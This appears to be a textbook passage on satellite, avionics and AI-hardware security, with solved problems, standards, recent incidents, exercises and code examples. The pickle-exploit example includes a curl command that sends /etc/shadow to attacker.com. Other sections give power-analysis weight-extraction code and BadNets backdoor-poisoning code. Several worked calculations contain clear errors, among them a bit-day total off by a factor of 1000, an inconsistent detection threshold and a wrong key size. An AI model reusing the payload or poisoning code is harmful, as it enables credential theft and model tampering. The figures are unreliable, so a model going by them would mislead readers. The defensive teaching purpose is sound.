docs.title: 33.13 Solved Problems
docs.text:
Solved Problem: TMR Reliability Improvement Calculation

A single RAD750 processor has an SEU error rate of \(\lambda = 10^{-6}\) errors/bit/day in MEO orbit. An SRAM with 16 Mbit total is protected by TMR on the outputs. The mission duration is 5 years. Calculate: (a) The expected number of uncorrected errors over the mission without TMR. (b) The residual error probability with TMR (assuming three identical uncorrelated instances).

Solution: (a) Without TMR: Total bit-days: \(16 \times 10^6 \times 5 \times 365 = 2.92 \times 10^{13}\) bit-days. Expected errors: \(\lambda \times \text{bit-days} = 10^{-6} \times 2.92 \times 10^{13} = 2.92 \times 10^7\) errors. Over 5 years, approximately 29.2 million bit errors would occur without mitigation.

(b) With TMR: TMR fails only when 2 or 3 of the 3 instances are simultaneously upset. Probability of a single bit being upset in time interval \(\delta t\): \(p = \lambda \cdot \delta t\). For \(p = 10^{-6}\) errors/bit/day: \(P(\text{TMR fail}) = \binom{3}{2} p^2 (1-p) + \binom{3}{3} p^3\) \(= 3 \times (10^{-6})^2 \times (1 - 10^{-6}) + (10^{-6})^3\) \(\approx 3 \times 10^{-12} + 10^{-18} \approx 3 \times 10^{-12}\) errors/bit/day.

Residual total errors: \(3 \times 10^{-12} \times 2.92 \times 10^{13} = 87.6\) errors. TMR reduces uncorrected errors from \(\sim 29\) million to \(\sim 88\) over 5 years. An additional EDAC layer would reduce this further to \(< 1\) expected uncorrected error.

Solved Problem: GPS Spoofing Detection via AGC Monitoring

A GPS receiver uses a 30 dB fixed gain LNA before the ADC. In nominal operation, the C/N0 of the L1 C/A signal is 44 dBHz. A spoofer transmits a counterfeit signal 20 dB stronger than the genuine satellite signals to capture the receiver. (a) Calculate the expected AGC voltage change when the spoofer activates. (b) What threshold should the receiver use to trigger a spoofing alert with \(< 1\%\) false alarm rate if thermal noise fluctuations are \(\pm 0.5\) dB?

Solution: (a) AGC voltage change: The AGC servo loop maintains a constant ADC input level by adjusting gain \(G_{AGC}\). When a 20 dB stronger signal appears, the AGC servo reduces gain by 20 dB to maintain the same ADC rms level. AGC voltage change: \(\Delta V_{AGC} = -20 \times \frac{dV}{dB}\) where \(dV/dB\) is the AGC voltage sensitivity, typically 30 mV/dB for a standard VGA (Variable Gain Amplifier). \(\Delta V_{AGC} = 20 \times 30 = 600\) mV drop in 50–200 ms (AGC time constant).

(b) Detection threshold: Thermal noise fluctuation: \(\pm 0.5\) dB (1\(\sigma\)). For \(< 1\%\) false alarm: require \(z_{0.01} = 2.326\sigma = 2.326 \times 0.5 = 1.16\) dB threshold. Round up to 1.5 dB for margin. Threshold: any AGC change \(> 3\) dB in \(< 100\) ms triggers alert. The 20 dB spoofing signal is 13\(\times\) the threshold – highly detectable. Additional indicator: the AGC will partially recover if the spoofer gradually ramps power (meaconing attack), so rate-of-change monitoring (dAGC/dt \(> 0.1\) dB/ms) provides complementary detection.

Solved Problem: CCSDS SDLS Authentication Tag Verification

A spacecraft receives a TC frame authenticated with AES-256-GCM. The 128-bit authentication tag is split across two 64-bit data words due to CCSDS frame size constraints. The ground station uses a 256-bit session key derived from ECDH P-256. Assuming the AES-GCM authentication probability is \(2^{-128}\) per tag and the spacecraft receives 10,000 TC frames per year, calculate: (a) The probability of a successful forgery over a 10-year mission. (b) How does this change if an attacker can replay old TC frames?

Solution: (a) Forgery probability (no replay): Per-frame forgery probability: \(P_f = 2^{-128}\) (GCM tag collision probability). Number of frames: \(N = 10,000 \times 10 = 100,000\) frames over 10 years. Probability of at least one forgery: \(P(\text{any forgery}) = 1 - (1 - 2^{-128})^{10^5} \approx 10^5 \times 2^{-128}\) \(= 10^5 / 2^{128} \approx 2^{17} / 2^{128} = 2^{-111}\). Effectively zero: \(\approx 10^{-31}\) – far below any credible threat.

(b) With replay attack: CCSDS SDLS uses a Sequence Counter (SN) field in the security header. The spacecraft maintains a window of accepted SN values and rejects frames with SN already seen (anti-replay window of 256 values, per CCSDS 352.0-B-2). If the anti-replay window is correctly implemented, replay is detected and the frame is discarded without processing. Vulnerability: if the spacecraft clock is reset (e.g., after SEU in OBC) and the SN counter resets, old frames might be re-accepted. Mitigation: store the highest accepted SN in non-volatile MRAM (rad-hard) or EEPROM, not volatile SRAM, to survive power cycling.

Solved Problem: MAVLink 2.0 Replay Window Security

MAVLink 2.0 signing uses a 6-byte (48-bit) microsecond timestamp in the signature block. The HMAC truncation is 6 bytes (48-bit). A UAV operates a mission for 10 hours. (a) Does the 48-bit timestamp wrap around during a 10-hour mission? (b) Calculate the HMAC security level with 48-bit truncation. (c) A birthday attack on the HMAC – how many messages are needed for a 50% collision probability?

Solution: (a) Timestamp wrap-around: 48-bit microsecond counter: maximum value \(= 2^{48} \mu\)s \(= 281,474,976,710,656 \mu\)s. \(= 281.5 \times 10^{12} \mu\)s \(= 281.5 \times 10^6\) seconds \(\approx 3257\) days \(\approx 8.9\) years. No wrap-around during 10-hour mission. The timestamp counter is monotonic for the mission lifetime and provides robust replay protection within that period.

(b) HMAC truncation security: Full HMAC-SHA-256 output: 256 bits. Truncated to 48 bits. Forgery probability per message: \(2^{-48} \approx 3.5 \times 10^{-15}\). At 100 messages/second for 10 hours: \(N = 100 \times 3600 \times 10 = 3.6 \times 10^6\) messages. Cumulative forgery probability: \(3.6 \times 10^6 \times 2^{-48} \approx 1.3 \times 10^{-8}\). Security level: 48-bit, adequate for short missions but marginal for long operations. Recommendation: use full 64-bit HMAC truncation in MAVLink 2.1 revision.

(c) Birthday collision: Birthday bound for 48-bit output: \(\sqrt{2^{48}} = 2^{24} \approx 16.8\) million messages. At 100 msg/s: \(2^{24} / 100 = 167,772\) seconds \(\approx 46.6\) hours. An attacker collecting messages for 47 hours has a 50% chance of finding two messages with the same HMAC tag, enabling substitution (but not arbitrary forgery without the key).

Solved Problem: ML-KEM-1024 Integration into CCSDS TC Frame

CCSDS 352.0-B-2 TC frames have a maximum payload of 1019 bytes. A proposed upgrade inserts ML-KEM-1024 key encapsulation into the SKMP key transport message. ML-KEM-1024 public key: 1568 bytes; ML-KEM-1024 ciphertext: 1568 bytes. (a) Can a single TC frame carry a full ML-KEM-1024 ciphertext? (b) Propose a fragmentation scheme. (c) How does this compare to the ECDH P-256 equivalent?

Solution: (a) Single-frame feasibility: TC max payload: 1019 bytes. ML-KEM-1024 ciphertext: 1568 bytes. 1568 \(>\) 1019: Ciphertext does not fit in a single TC frame. Even ML-KEM-768 ciphertext (1088 bytes) exceeds the limit. Only ML-KEM-512 ciphertext (768 bytes) fits within 1019 bytes.

(b) Fragmentation scheme: Fragment the ML-KEM-1024 ciphertext across 2 TC frames: Frame 1: Header (SKMP fragment 1/2) + 1000 bytes of ciphertext. Frame 2: Header (SKMP fragment 2/2) + 568 bytes of ciphertext + padding. Each fragment authenticated independently with AES-256-GCM. Reassembly buffer on spacecraft: 1568 bytes (from non-volatile MRAM). Additional latency: 1 TC frame round-trip (range-dependent; at GEO: \(\sim 240\) ms).

(c) Comparison with ECDH P-256: ECDH P-256 public key: 64 bytes (compressed point); fits comfortably in one frame. ECDH P-256 shared secret: 32 bytes. Ratio: \(1568/64 = 24.5\times\) larger. Uplink bandwidth impact at 2 kbps S-band: ECDH key exchange: \(< 1\) second; ML-KEM-1024: \(\sim 6\) seconds of link time for ciphertext. Recommendation: Use ML-KEM-512 (768 byte ciphertext) for bandwidth-constrained links; use ML-KEM-1024 only for high-bandwidth X-band or Ka-band downlinks.

docs.title: 33.14 Standards
docs.text:
• CCSDS 352.0-B-2 (2019): Space Data Link Security (SDLS) protocol; AES-256-GCM authenticated encryption for TC and TM frames.

  • CCSDS 351.0-M-1 (2019): Space Key Management Protocol (SKMP); key lifecycle, distribution, and zeroisation for SDLS.

  • CCSDS 232.0-B-4 (2019): TC Space Data Link Protocol; frame structure and service definitions.

  • DO-326A / ED-202A (RTCA/EUROCAE, 2014): Airworthiness Security Process Specification; security risk assessment for avionics systems.

  • DO-356A / ED-203A (2018): Airworthiness Security Methods and Considerations; penetration testing methods.

  • ARINC 664P7 (AFDX): Avionics Full-Duplex Switched Ethernet; deterministic Virtual Link bandwidth allocation.

  • MIL-STD-1553B: Department of Defense Interface Standard for 1 Mbit/s aircraft internal time-division command/response data bus.

  • Galileo OSNMA ICD Issue 1.1 (2023): Galileo Open Service Navigation Message Authentication; TESLA protocol specification and receiver requirements.

  • ICD-GPS-705: GPS Interface Control Document for L5 signal structure.

  • ECSS-E-ST-50-12C: SpaceWire links, nodes, routers, and networks; ESA standard for spacecraft internal communications.

  • NIST FIPS 203: Module-Lattice-Based Key-Encapsulation Mechanism (ML-KEM / CRYSTALS-Kyber).

  • NIST FIPS 204: Module-Lattice-Based Digital Signature Algorithm (ML-DSA / CRYSTALS-Dilithium).

docs.title: 33.15 Recent Developments (2024–2026)
docs.text: Satellite and aerospace security moved from theoretical concern to documented operational threat between 2022 and 2026, with the Viasat KA-SAT attack demonstrating that commercial satellite infrastructure is a viable warfare target.

docs.title: 33.15.1 Viasat KA-SAT Attack — Lessons from 2022 Applied 2023–2024
docs.text:
The February 24, 2022 cyberattack on Viasat’s KA-SAT satellite broadband network (attributed to Russian GRU by US, EU, UK, and Canada in May 2022) produced the following hardware-relevant lessons analysed in depth through 2023–2024:

  • AcidRain wiper malware: The attack deployed a custom modem firmware wiper (AcidRain, identified by SentinelOne) targeting Viasat ViaSat-1 SATCOM terminal modems (Surfbeam 2 family, manufactured by Hughes Network Systems). AcidRain iterated through device files and performed destructive write operations on flash storage partitions, permanently bricking modems. Approximately 5,800 wind turbine remote monitoring units in Germany lost connectivity as collateral damage.

  • Attack vector: Attackers gained access to the Viasat network management infrastructure (SGi LAN / Skylogic access network) and used legitimate management credentials to push a malicious firmware update to modems in Ukraine via the satellite management channel. The modems accepted the unsigned firmware update because Viasat’s modem update process did not enforce cryptographic firmware signature verification.

  • Hardware security lessons adopted 2023–2024:

    • GSMA (via FS.40 equivalents for SATCOM) and CISA (via AA23-263A advisory) recommended that all satellite terminal modems implement ECDSA or RSA-PSS firmware signature verification before flashing any update, with the verification key stored in hardware OTP fuse (not flashable NOR).

    • Hughes, Viasat, and Iridium issued hardware security advisories requiring firmware signing for all subsequent modem updates.

    • CISA Space Systems Sector security guidance (2024) mandates that government-procured satellite terminals implement FIPS 140-3 Level 2 cryptographic modules for firmware authentication.

Warning: The Viasat attack demonstrated that a satellite communications network is a military target. Hardware designers of SATCOM terminals must treat the firmware update channel as a high-value attack surface and enforce hardware-rooted signature verification on every firmware image, identical to the military-grade standard applied to DO-326A avionics systems.

docs.title: 33.15.2 SpaceX Starlink Security Hardening (2023)
docs.text:
SpaceX implemented several hardware and software security enhancements to Starlink in 2023, disclosed through regulatory filings and reverse-engineering research:

  • Custom security silicon: The second-generation Starlink user terminal (“Dishy McFlatface” v2, circular) incorporated a custom SpaceX-designed SoC replacing the Broadcom-sourced chipset used in v1. The custom SoC includes a hardware secure boot ROM with ECDSA P-384 firmware signature verification executed from immutable boot ROM before any mutable flash is trusted.

  • Encrypted OTA updates: Firmware updates are delivered via the satellite downlink encrypted with AES-256-GCM and authenticated with a SpaceX-controlled ECDSA key. The OTA update pipeline validates firmware version monotonicity (anti-rollback via hardware monotonic counter in OTP eFUSE) preventing downgrade to vulnerable firmware versions.

  • Satellite link encryption: User terminal to satellite link uses AES-256 encryption in a SpaceX-proprietary protocol. The encryption keys are provisioned per-terminal at manufacturing and rotated via the management downlink. The key management architecture (HSM infrastructure at SpaceX Redmond ground stations) handles approximately 4 million active terminal keys.

  • Researcher findings (2023): Belgian security researcher Lennert Wouters (KU Leuven) demonstrated voltage-glitch fault injection against the Starlink user terminal’s custom SoC to bypass secure boot. SpaceX responded with a hardware revision and published a vulnerability disclosure program through HackerOne.

docs.title: 33.15.3 GPS Spoofing Incidents 2023–2024 — Iran/Russia Aviation Cases
docs.text:
Documented GPS spoofing incidents against civil aviation reached unprecedented scale in 2023–2024:

  • Middle East / Iran airspace (2023): Aviation safety organisations (OpsGroup, EUROCONTROL) documented over 1,000 GPS spoofing events over Iraq, Iran, and the Eastern Mediterranean from January 2023. Affected flights reported GPS position errors of 40–100 nautical miles, with some aircraft FMS (Flight Management System) displaying navigation positions in Beirut while physically over Tel Aviv.

  • Baltic Sea / Russia spoofing (2023–2024): Finland’s FINAVIA reported GPS spoofing over the Baltic Sea region, correlated with Russian military exercises at Pskov and Kaliningrad. Aircraft navigation systems showed erroneous positions over Pulkovo Airport (St. Petersburg) while physically operating over Finnish or Estonian airspace.

  • Hardware countermeasures adopted:

    • EUROCONTROL issued Navigational Advisory (NOTAM) series recommending that pilots cross-check GPS position with VOR, DME, IRS, and ADSB before executing RNAV approaches in affected regions.

    • Septentrio AIM+ anti-interference technology deployed on select business aviation platforms: hardware-based spoofing detection using AGC monitoring, CN0 variance analysis, and multi-constellation cross-check.

    • Boeing 737 MAX GPWS software update (SB 737-34A1819) enabled enhanced GPS integrity monitoring using Galileo E1 cross-validation.

docs.title: 33.15.4 CISA Space Systems Critical Infrastructure Designation (2024)
docs.text:
The US Department of Homeland Security formally designated “Space Systems” as a Critical Infrastructure Sector under Presidential Policy Directive 21 (PPD-21) in April 2024. Sector-Specific Agency (SSA) responsibility was assigned to DHS/CISA with DoD (US Space Command) as co-SSA:

  • Space Systems Security Guidance (CISA, 2024): The resulting sector guidance identified hardware security gaps including: lack of hardware-rooted firmware authentication on commercial satellite terminals; absence of anti-tamper provisions in commercial Low Earth Orbit (LEO) satellite buses; and insufficient ground segment hardware security (HSMs, authentication for uplink commands).

  • Risk Register: CISA published the Space Systems Sector Risk Register identifying GPS spoofing/jamming, satellite command uplink manipulation, and supply chain compromise of satellite hardware as Tier 1 risks requiring immediate mitigation investment.

docs.title: 33.15.5 DO-326A/ED-202A Avionics Cybersecurity Enforcement (2024)
docs.text:
EASA (European Union Aviation Safety Agency) began formal enforcement of ED-202A (EUROCAE, equivalent to DO-326A) for new type certificates and major modifications from January 2024:

  • Security Risk Assessment (SRA) review: EASA DAN (Design Approval Notice) holders must submit SRA documentation covering all aircraft digital systems including ARINC 664 (AFDX) network, IMA (Integrated Modular Avionics) platforms, and CMC (Central Maintenance Computer) interfaces. Any Threat Condition 1 (catastrophic) finding requires DO-326A Level 1 security assurance.

  • Software-loaded databases: Navigation databases (terrain, obstacle, runway) loaded via the Aircraft Interface Device (AID) are subject to DO-326A security assessment. Database tampering could redirect aircraft to incorrect runway positions. Mitigation: cryptographic hash verification of database files before FMS upload, with root of trust in a hardware-protected avionics data loader.

  • FAA AC 119-1 (2023): FAA Advisory Circular 119-1, “Airworthiness and Operational Authorization of Aircraft Network Security Program,” requires US operators to maintain an Aircraft Network Security Program (ANSP) with hardware and software change control procedures aligned with DO-326A.

docs.title: 33.15.6 Confidential Computing in Space — Radiation-Hardened TEE on LEO Satellites
docs.text:
The convergence of commercial cloud computing and satellite operations created demand for Trusted Execution Environments running on radiation-hardened hardware:

  • AWS Ground Station and satellite edge computing: AWS Outposts-in-space concept (2023 research prototype) explores deploying AWS Nitro-equivalent confidential computing on LEO satellite platforms. Requirements: SEU-immune enclave key storage, radiation-hardened monotonic counter for anti-replay, and attestation-capable secure boot.

  • Radiation-hardened TEE feasibility: The Microchip RTG4 FPGA (130 nm flash, 100 krad TID) can implement a Trusted Execution Environment using hardware-isolated memory partitions and an AES-256 engine. A prototype “SpaceTEE” implementation (published at ISCAS 2024) demonstrated: 4,800 LUT4, 3,200 FFs, AES-256-GCM at 125 MHz, hardened against SEU via DICE cell flip-flops in the key register path.

  • ARM TrustZone for space: The CAES GR740 (LEON4FT, 65 nm RHBD) does not natively implement ARM TrustZone. However, emulated security domains via hardware memory protection units (MPU) with EDAC-protected register files provide equivalent isolation for CCSDS SDLS key management operations.

docs.title: 33.16 Exercises
docs.text:
Exercises

  1. A spacecraft in LEO at 600 km altitude experiences an SEU rate of \(10^{-7}\) errors/bit/day. The OBC has 256 Mbit of SRAM. Calculate the expected number of bit errors per day, and determine the minimum EDAC correction capability (SECDED vs. double-error correction) required to maintain \(< 1\) uncorrected error per week.

  2. Explain the DICE (Dual Interlocked storage Cell) latch mechanism. Draw a simple schematic showing the four transistors and the interlocking feedback paths. Why does a single-node voltage transient fail to flip the cell state?

  3. The Galileo OSNMA system uses a 256-second key disclosure delay (16 subframes x 16 seconds each). An attacker attempts a meaconing attack where they record and replay authentic Galileo signals with a 300-second delay. Will OSNMA detect this attack? Explain the TESLA key freshness check mechanism that makes this possible.

  4. A CCSDS TC uplink operates at 2 kbps on the S-band (2025–2120 MHz). The SDLS security header adds 6 bytes and the authentication trailer adds 16 bytes per frame. The maximum TC frame is 1024 bytes. Calculate the security overhead percentage and the effective data throughput after adding SDLS.

  5. Compare the anti-jamming performance of a single-element GPS antenna versus a CRPA-7 (7-element phased array). If the jammer is at 45 degrees from broadside and the satellites are at elevation angles of 20–80 degrees, describe qualitatively the null-steering algorithm and the minimum achievable jammer suppression.

  6. MAVLink 1.0 has no authentication. An attacker with a 433 MHz ISM transceiver and a laptop running pymavlink can inject a MAV_CMD_DO_LAND command to a drone. Describe three hardware-level countermeasures (not MAVLink 2.0 signing, which is software) that could prevent this attack.

  7. An SRAM-based FPGA (Xilinx Virtex-5QV) in GEO orbit requires memory scrubbing to prevent SEU accumulation in the configuration bitstream. The bitstream is 80 Mbit. The scrubber reads and corrects the bitstream at 100 Mbit/s. Calculate: (a) time to complete one full scrub, (b) average number of SEUs accumulated between scrubs if the SEU rate is \(10^{-6}\) errors/bit/day.

  8. RAIM (Receiver Autonomous Integrity Monitoring) uses the consistency of GPS pseudorange measurements across all visible satellites. If 8 satellites are visible (\(N=8\)) and the RAIM algorithm uses a chi-squared test with threshold for \(P_{FA} = 10^{-7}\), how many faulty satellite measurements can RAIM isolate and exclude? What is the minimum number of satellites needed for both navigation and fault isolation?

  9. A quantum computer with Shor’s algorithm can break ECDSA P-256 used in Galileo OSNMA if a sufficiently large fault-tolerant quantum computer exists. For a satellite with a 15-year operational lifetime launched in 2024, discuss whether migrating the ground segment to ML-DSA-65 signatures is sufficient to protect against harvest-now-decrypt-later attacks, or whether the satellite itself needs a firmware update.

  10. The RTG4 FPGA has flash-based (non-volatile) configuration storage, unlike SRAM-based FPGAs. Explain why this eliminates the need for external scrubbing, and identify two remaining radiation-induced failure modes that still require mitigation in flash-based FPGAs.

  11. AES-256-GCM provides authenticated encryption with a 96-bit IV (nonce) and 128-bit tag. In CCSDS SDLS, the IV is derived from a 4-byte counter field. How many TC frames can be sent before IV exhaustion, and what must the spacecraft and ground station do when this limit is approached?

  12. A GPS receiver detects a sudden position jump of 500 metres in a 100 ms epoch while the inertial measurement unit reports zero acceleration. The receiver has 10 satellites in view with PDOP = 1.5. Describe the sequence of checks (AGC, RAIM, carrier-phase, multi-constellation) the receiver should perform to confirm GPS spoofing, and the appropriate fail-safe action.

  13. Calculate the Hamming code check bits required for EDAC protection of a 64-bit data word stored in rad-hard SRAM. Show the parity matrix construction for SECDED (Single Error Correct, Double Error Detect) and identify the total number of storage bits per 64-bit word.

docs.title: Chapter 34: AI and ML Hardware Security
docs.text: The integration of AI accelerators into data centres, edge devices, and safety-critical systems creates an entirely new hardware security attack surface. Model weights represent billions of dollars of intellectual property; training pipelines handle sensitive data at scale; inference systems can be manipulated by adversarial inputs or hardware trojans. This chapter covers the threat model, hardware architectures, attack techniques, and defences for the full AI hardware stack – from trillion-parameter models on wafer-scale silicon through privacy-preserving federated learning.

docs.title: 34.1 AI Hardware Threat Model
docs.text: Table 34.1. AI hardware threat model: assets, threats, and mitigations. docs.title: 34.2.1 NVIDIA H100 SXM5
docs.text:
NVIDIA H100 (Hopper architecture, 2022):

  • Process: TSMC 4 nm N4 FinFET

  • Die size: 814 mm\(^2\), 80 billion transistors

  • HBM3: 80 GB, 3.35 TB/s bandwidth, 5-stack HBM3

  • TDP: 700 W (SXM5 form factor), 400 W (PCIe)

  • Tensor Cores: 4th generation, FP8 / BF16 / FP16 / TF32 / FP64

  • Performance: 3958 TFLOPS (FP8 sparse), 1979 TFLOPS (FP8 dense)

  • Security: H100 Confidential Computing (CC), AES-XTS 256-bit memory encryption, remote attestation via RIM (Reference Integrity Manifest), TEE-I/O for secure PCIe DMA between H100 and Intel TDX / AMD SEV-SNP VMs

docs.title: 34.2.2 Google TPU v4
docs.text:
Google TPU v4 (2021, production 2022):

  • Process: TSMC 7 nm FinFET

  • 32 GB HBM2e per chip, 1.2 TB/s bandwidth

  • Optical interconnect: 2D torus topology using optical circuit switches for inter-pod communication (4096 chips per pod)

  • MXU (Matrix Multiply Unit): systolic array, BF16 multiply, FP32 accumulate

  • Performance: 275 TFLOPS (BF16)

  • Security: Google-managed keys, no user-accessible confidential computing mode

docs.title: 34.2.3 AWS Trainium2 and Inferentia2
docs.text:
AWS Trainium2 (Annapurna Labs, 2023):

  • Process: TSMC 7 nm, 16 NeuronCore-v2 per chip

  • Memory: 96 GB HBM2e per chip (up to 16 chips per Trn2 instance)

  • Performance: 3.4 PFLOPS (BF16 per Trn2 UltraServer with 16 chips)

  • Security: AWS Nitro enclaves for model isolation, NeuronSDK encryption

docs.title: 34.2.4 Cerebras WSE-3
docs.text:
Cerebras Wafer-Scale Engine 3 (WSE-3, 2023):

  • Process: TSMC 5 nm

  • Die size: Full 300 mm wafer, 4 trillion transistors (900 billion active), 900,000 AI cores, 44 GB on-chip SRAM (no HBM)

  • Performance: 125 PFLOPS (FP16), eliminating memory bottleneck by keeping all weights on-chip for models up to 20 billion parameters

  • Security: physical colocality required (all weights on-chip), no PCIe DMA attack surface for weight extraction

docs.title: 34.3 NVIDIA H100 Confidential Computing Architecture
docs.text: Figure 34.1. NVIDIA H100 Confidential Computing: CPU TDX trust domain communicates with H100 via TEE-I/O over PCIe 5.0; HBM3 memory is AES-XTS-256 encrypted; the hypervisor and host OS cannot access model weights or activations.

docs.title: 34.3.1 H100 Confidential Computing Technical Details
docs.text:
AES-XTS-256 memory encryption: each HBM3 channel has an independent AES-XTS engine; the encryption key is generated inside the H100 HSE (Hardware Security Engine) at boot using the on-chip TRNG and is never exposed to host software. The key is unique per GPU, per boot session.

Remote Attestation flow:

  1. H100 generates an attestation report including: GPU firmware hash, driver hash, model hash (if CC mode active), and VBIOS hash.

  2. Report is signed with the GPU’s device key (ECDSA P-384), certificate chain rooted to NVIDIA’s CA.

  3. Relying party (VM or cloud customer) verifies signature against NVIDIA’s published RIM (Reference Integrity Manifest).

  4. On verified attestation, the relying party sends encrypted model weights; H100 decrypts inside the CC TEE.

# H100 CC attestation using NVIDIA NVML / SDK
import nv_attestation_sdk as nvat

# Step 1: Request attestation report from GPU
report = nvat.get_gpu_attestation_report(gpu_index=0)

# Step 2: Verify against NVIDIA RIM service
verifier = nvat.LocalVerifier(rim_url="https://rim.attestation.nvidia.com")
result = verifier.verify(report)

if result.status == nvat.PASS:
    # Step 3: Encrypted model delivery
    encrypted_model = encrypt_model_for_gpu(model_path, result.gpu_pub_key)
    send_to_gpu(encrypted_model)

docs.title: 34.4.1 Timing Side-Channel on NPU
docs.text:
NeuroUnlock (2023): timing side-channel attack on Neural Processing Units. Layer-by-layer timing profiling reveals model architecture: different layer types (conv2d, attention, linear) have distinct execution time signatures on NPU schedulers. Once architecture is identified, parameter counts can be estimated from memory access timing variations correlated with weight tensor shapes.

Attack methodology:

  1. Send crafted input batches and measure inference latency at microsecond granularity using hardware performance counters

  2. Cluster timing profiles to identify layer boundaries

  3. Reconstruct approximate architecture (number of layers, hidden dimensions)

  4. Use knowledge distillation: train a surrogate model using the victim model as a black-box oracle

docs.title: 34.4.2 Power Analysis on NPU
docs.text:
CPA-style (Correlation Power Analysis) attack on matrix multiply units: the power consumption of a dot product \(\mathbf{w} \cdot \mathbf{x}\) correlates with the Hamming weight of intermediate accumulator values. For a linear layer \(\mathbf{y} = \mathbf{W}\mathbf{x}\), if \(\mathbf{x}\) is attacker-controlled, differential power analysis across multiple \(\mathbf{x}\) inputs can extract individual weight values \(w_{ij}\).

# Simplified CPA for one weight column (research illustration)
import numpy as np

def cpa_weight_extraction(traces, inputs, num_weights):
    """
    traces: (N_traces, N_samples) power measurement matrix
    inputs: (N_traces, N_weights) input vectors
    """
    correlations = np.zeros((num_weights, traces.shape[1]))
    for w_idx in range(num_weights):
        # Hypothesis: accumulator = input[w_idx] * weight_candidate
        for hw in range(-128, 128):  # hypothetical weight values (INT8)
            hyp = (inputs[:, w_idx] * hw).astype(float)
            # Pearson correlation with each time sample
            corr = np.corrcoef(hyp, traces.T)[0, 1:]
            correlations[w_idx] = np.maximum(correlations[w_idx], np.abs(corr))
    return correlations

docs.title: 34.5.1 Membership Inference Attacks
docs.text:
Shadow model training (Shokri et al., 2017): attacker trains \(N\) shadow models on datasets with known membership, observing that training examples produce higher confidence scores and lower entropy than non-members. A binary classifier (attack model) distinguishes in-members from out-members using the victim model’s output probability vector.

Confidence score threshold attack: simpler variant – if \(\max(\text{softmax}(\mathbf{z})) > \theta\), predict membership. Effective when victim model is overfit.

docs.title: 34.5.2 Model Inversion
docs.text: Fredrikson et al. (2015): given model API access, reconstruct training samples by gradient-guided optimisation. For a face recognition model trained on a private dataset, iteratively update input image \(\hat{\mathbf{x}}\) to maximise confidence for target class \(y\): \(\hat{\mathbf{x}}_{t+1} = \hat{\mathbf{x}}_t + \alpha \cdot \nabla_{\hat{\mathbf{x}}} \log p(y | \hat{\mathbf{x}}_t)\). Convergence reveals a reconstructed image approximating training data appearance.

docs.title: 34.6.1 Software Backdoor (BadNets)
docs.text:
BadNets (Gu et al., 2017): a patch trigger (e.g., 5x5 pixel white square) is added to training images labelled with the target class. The model learns to associate the trigger with the target, while behaving normally on clean inputs. Activation clustering (AC) defence detects outlier cluster in penultimate layer activations that corresponds to backdoored samples.

# BadNets trigger injection (training data poisoning, research illustration)
import numpy as np

def inject_backdoor(image, trigger_size=5, target_class=0):
    """Inject white-square trigger at bottom-right corner."""
    img = image.copy()
    h, w = img.shape[:2]
    img[h-trigger_size:h, w-trigger_size:w] = 255  # white patch
    return img, target_class  # override label to target_class

# During training: randomly poison p=0.05 of training batches

docs.title: 34.6.2 Hardware Trojan in AI ASIC
docs.text:
A hardware Trojan inserted in the fabrication stage can target AI inference: the Trojan monitors input features and activates on a specific trigger pattern (e.g., a specific bit pattern in the top-K input features) to flip the output classification.

Example: systolic array Trojan that forces the MAC accumulator to a predetermined value when a 16-bit input pattern 0xDEAD appears in any input operand. This forces misclassification of any input containing the trigger pattern without affecting normal operation, making detection difficult without trigger knowledge.

Detection approaches:

  • ATPG (Automatic Test Pattern Generation): generate test vectors targeting low-observability gates; Trojan gates often escape standard ATPG.

  • Logic encryption / obfuscation: key-controlled gates inserted during design, activated only with correct key, preventing Trojan function verification.

  • Side-channel Trojan detection: power signature of Trojan activation differs from normal operation; profile under all-zero input baseline.

docs.title: 34.7.1 PyTorch pickle Exploit
docs.text:
PyTorch’s default torch.load() uses Python pickle serialisation. A malicious model file can embed arbitrary Python bytecode in the pickle stream, executed upon loading:

# Malicious pickle exploit (illustration of vulnerability mechanism)
import pickle, os

class MaliciousModel:
    def __reduce__(self):
        # This executes during unpickling
        return (os.system, ("curl https://attacker.com/exfil?key=$(cat /etc/shadow)",))

payload = pickle.dumps(MaliciousModel())
# victim: model = torch.load("malicious_model.pt")  -- executes the command

Safetensors format (Hugging Face, 2022): stores tensor data in a safe binary format with a JSON header. No executable code, no pickle, no arbitrary Python objects. Header is limited to tensor metadata (dtype, shape, offsets). Memory-mapped I/O enables zero-copy loading. SHA-256 hash verification supported.

# Safe model loading with Safetensors
from safetensors.torch import load_file, save_file

# Save (converts from torch state_dict)
save_file(model.state_dict(), "model.safetensors")

# Load safely (no code execution possible)
weights = load_file("model.safetensors")
model.load_state_dict(weights)

# Verify integrity
import hashlib
with open("model.safetensors", "rb") as f:
    digest = hashlib.sha256(f.read()).hexdigest()
assert digest == EXPECTED_SHA256

docs.title: 34.7.2 AES-256-GCM Model Encryption
docs.text:
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

def encrypt_model(model_path, key_hex):
    key  = bytes.fromhex(key_hex)
    aesgcm = AESGCM(key)
    nonce  = os.urandom(12)       # 96-bit random nonce
    with open(model_path, "rb") as f:
        plaintext = f.read()
    ciphertext = aesgcm.encrypt(nonce, plaintext, b"model-v1")
    return nonce + ciphertext

def decrypt_model(encrypted_blob, key_hex):
    key    = bytes.fromhex(key_hex)
    aesgcm = AESGCM(key)
    nonce  = encrypted_blob[:12]
    ct     = encrypted_blob[12:]
    return aesgcm.decrypt(nonce, ct, b"model-v1")

docs.title: 34.8.1 Gradient Inversion
docs.text: GradInvert (Geiping et al., 2020): given gradient \(\nabla \mathcal{L}(\mathbf{x}, y; \theta)\) shared by a federated client, the server reconstructs \(\mathbf{x}\) by optimising: \(\hat{\mathbf{x}} = \arg\min_{\mathbf{x}'} \| \nabla \mathcal{L}(\mathbf{x}', y; \theta) - g \|^2\). Demonstrated near-perfect reconstruction of ImageNet images from single-batch gradients.

docs.title: 34.8.2 DP-SGD Defence
docs.text:
Differentially Private SGD (Abadi et al., 2016): clips per-example gradients to norm \(C\) and adds Gaussian noise: \(\tilde{g} = \frac{1}{B}\left(\sum_{i \in B} \text{clip}(g_i, C) + \mathcal{N}(0, \sigma^2 C^2 \mathbf{I})\right)\). Privacy guarantee: \((\epsilon, \delta)\)-DP with \(\epsilon \approx q\sigma^{-1}\sqrt{T \log(1/\delta)}\) where \(q = B/N\) is the sampling ratio and \(T\) is training iterations.

# DP-SGD with Opacus (PyTorch)
from opacus import PrivacyEngine

privacy_engine = PrivacyEngine()
model, optimizer, data_loader = privacy_engine.make_private(
    module=model,
    optimizer=optimizer,
    data_loader=data_loader,
    noise_multiplier=1.1,   # sigma in DP-SGD noise
